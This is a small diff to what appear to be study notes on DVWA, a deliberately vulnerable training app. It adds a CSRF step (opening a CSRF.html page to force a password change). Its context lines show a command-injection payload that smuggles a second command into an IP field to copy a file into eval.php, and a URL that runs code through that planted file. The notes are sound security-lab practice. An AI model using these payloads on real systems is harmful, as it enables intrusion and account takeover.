@@ -16,3 +16,7 @@ Command Injection
 127.0.0.1 & cp eval.txt eval.php
 127.0.0.1/dvwa/vulnerablitites/exec/eval.php?cmd=phpinfo()
 ---
+CSRF
+---
+將CSRF.html點兩下開啟後點選click送出修改密碼
+---
